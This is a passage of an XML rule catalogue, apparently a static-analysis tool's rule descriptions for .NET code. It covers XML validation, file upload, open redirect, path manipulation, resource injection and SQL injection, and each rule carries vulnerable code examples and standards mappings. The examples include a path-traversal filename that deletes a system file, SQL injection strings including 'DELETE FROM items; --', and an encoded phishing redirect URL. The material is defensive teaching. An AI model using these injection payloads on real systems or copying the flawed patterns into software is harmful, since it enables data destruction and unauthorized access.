							  Failure to enable validation when parsing XML gives an attacker the opportunity to supply malicious input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input. It is not possible for an XML parser to validate all aspects of a document's content; a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 112</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18]  <em>XmlReader Class</em> Microsoft<br></p>
																									   <p>[19]  <em>XmlValidatingReader Class</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_often_misused_file_upload</key>
    <internalKey>Input Validation and Representation/Often Misused/File Upload</internalKey>
    <name>Often Misused: File Upload</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							   Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Regardless of the language a program is written in, the most devastating attacks often involve remote code execution, whereby an attacker succeeds in executing malicious code in the program's context. If attackers are allowed to upload files to a directory that is accessible from the Web and cause these files to be passed to a code interpreter (e.g. JSP/ASPX/PHP), then they can cause malicious code contained in these files to execute on the server.<br><br>The following code receives an uploaded file and assigns it to the <code>posted</code> object. <code>FileUpload</code> is of type <code>System.Web.UI.HtmlControls.HtmlInputFile</code>.<br><b>Example:</b><br><pre><br>HttpPostedFile posted = FileUpload.PostedFile;<br></pre><br>Even if a program stores uploaded files under a directory that isn't accessible from the Web, attackers might still be able to leverage the ability to introduce malicious content into the server environment to mount other attacks. If the program is susceptible to path manipulation, command injection, or dangerous file inclusion vulnerabilities, then an attacker might upload a file with malicious content and cause the program to read or execute it by exploiting another vulnerability.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 434</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 434</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 434</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[19] Alla Bezroutchko <em>Secure file upload in PHP web applications</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_open_redirect</key>
    <internalKey>Input Validation and Representation/Open Redirect</internalKey>
    <name>Open Redirect</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Redirects allow web applications to direct users to different pages within the same application or to external sites. Applications utilize redirects to aid in site navigation and, in some cases, to track how users exit the site. Open redirect vulnerabilities occur when a web application redirects clients to any arbitrary URL that can be controlled by an attacker.<br><br>Attackers can utilize open redirects to trick users into visiting a URL to a trusted site and redirecting them to a malicious site. By encoding the URL, an attacker can make it more difficult for end-users to notice the malicious destination of the redirect, even when it is passed as a URL parameter to the trusted site. Open redirects are often abused as part of phishing scams to harvest sensitive end-user data.<br><br><br><br><br><b>Example 1:</b> The following code instructs the user's browser to open a URL parsed from the <code>dest</code> request parameter when a user clicks the link.<br><br><pre><br>    String redirect = Request[&quot;dest&quot;];<br>    Response.Redirect(redirect);<br></pre><br><br>If a victim receives an email instructing the user to follow a link to &quot;http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com&quot;, the user might click on the link believing they would be transferred to the trusted site. However, when the user clicks the link, the code above will redirect the browser to &quot;http://www.wilyhacker.com&quot;.<br><br>Many users have been educated to always inspect URLs they receive in emails to make sure the link specifies a trusted site they know. However, if the attacker encoded the destination url as follows:<br> &quot;http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D&quot;<br><br>then even a savvy end-user may be fooled into following the link.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A10 Unvalidated Redirects and Forwards</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A10 Unvalidated Redirects and Forwards</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Content Spoofing</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 601</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 601</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 601</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_path_manipulation</key>
    <internalKey>Input Validation and Representation/Path Manipulation</internalKey>
    <name>Path Manipulation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing user input to control paths used in filesystem operations could enable an attacker to access or modify otherwise protected system resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Path manipulation errors occur when the following two conditions are met:<br><br>1. An attacker can specify a path used in an operation on the filesystem.<br><br>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.<br><br>For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example 1:</b> The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker may provide a file name like "<code>..\\..\\Windows\\System32\\krnl386.exe</code>", which will cause the application to delete an important Windows system file.<br><br><pre><br>String rName = Request.Item("reportName");<br>...<br>File.delete("C:\\users\\reports\\" + rName);<br></pre><br><br><b>Example 2:</b> The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension ".txt".<br><br><pre><br>sr = new StreamReader(resmngr.GetString("sub")+".txt");<br>while ((line = sr.ReadLine()) != null) {<br>Console.WriteLine(line);<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 22, CWE ID 73</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Path Traversal</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 022</em> <br></p>
																									   <p>[19] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 022</em> <br></p>
																									   <p>[20] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 426</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_registry_manipulation</key>
    <internalKey>Input Validation and Representation/Registry Manipulation</internalKey>
    <name>Registry Manipulation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing external control of registry settings can disrupt service or cause an application to behave in unexpected ways.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Registry manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 15</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_resource_injection</key>
    <internalKey>Input Validation and Representation/Resource Injection</internalKey>
    <name>Resource Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing user input to control resource identifiers could enable an attacker to access or modify otherwise protected system resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A resource injection issue occurs when the following two conditions are met:<br><br>1. An attacker can specify the identifier used to access a system resource.<br><br>For example, an attacker may be able to specify a port number to be used to connect to a network resource.<br><br>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.<br><br>For example, the program may give the attacker the ability to transmit sensitive information to a third-party server.<br><br>Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in separate category. See the path manipulation description for further details of this vulnerability.<br><br><b>Example:</b> The following code uses a port number read from an HTTP request to create a socket.<br><br><pre><br>int rPort = Int32.Parse(Request.Item("rPort"));<br>...<br>IPEndPoint endpoint = new IPEndPoint(address,rPort);<br>socket = new Socket(endpoint.AddressFamily,<br>                    SocketType.Stream, ProtocolType.Tcp);<br>socket.Connect(endpoint);<br>...<br></pre><br><br>The kind of resource affected by user input indicates the kind of content that may be dangerous.  For example, data containing special characters like period, slash, and backslash are risky when used in methods that interact with the file system. Similarly, data that contains URLs and URIs is risky for functions that create remote connections.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 99</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_sql_injection</key>
    <internalKey>Input Validation and Representation/SQL Injection</internalKey>
    <name>SQL Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine if the string is always safe.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where <code>owner</code> matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>string userName = ctx.getAuthenticatedUserName();<br>string query = "SELECT * FROM items WHERE owner = '"<br>				+ userName + "' AND itemname = '"<br>				+ ItemName.Text + "'";<br>sda = new SqlDataAdapter(query, conn);<br>DataTable dt = new DataTable();<br>sda.Fill(dt);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = &lt;userName&gt;<br>	AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>	SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'); DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	--'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be an effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure against SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[22] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[23] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[24] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_sql_injection_castle_activerecord</key>
    <internalKey>Input Validation and Representation/SQL Injection/Castle ActiveRecord</internalKey>
    <name>SQL Injection: Castle ActiveRecord</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
